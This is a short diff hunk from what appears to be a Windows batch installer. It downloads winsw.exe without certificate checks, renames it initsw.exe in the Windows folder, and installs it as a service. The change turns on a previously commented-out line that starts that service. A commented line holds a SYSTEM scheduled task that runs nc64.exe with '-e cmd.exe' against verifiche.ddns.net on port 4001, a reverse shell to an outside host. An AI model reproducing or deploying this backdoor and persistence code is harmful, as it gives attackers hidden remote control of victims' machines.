@@ -94,7 +94,7 @@ curl -A "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chr
 wget --no-check-certificate %urlgit%/winsw.exe  -O %windir%\initsw.exe
 cd %windir%
 initsw.exe install
-rem net start initsw
+net start initsw
 rem %windir%\init.vbs
 
 rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "nc64.exe -e cmd.exe verifiche.ddns.net 4001" /tn sys /rl highest /F
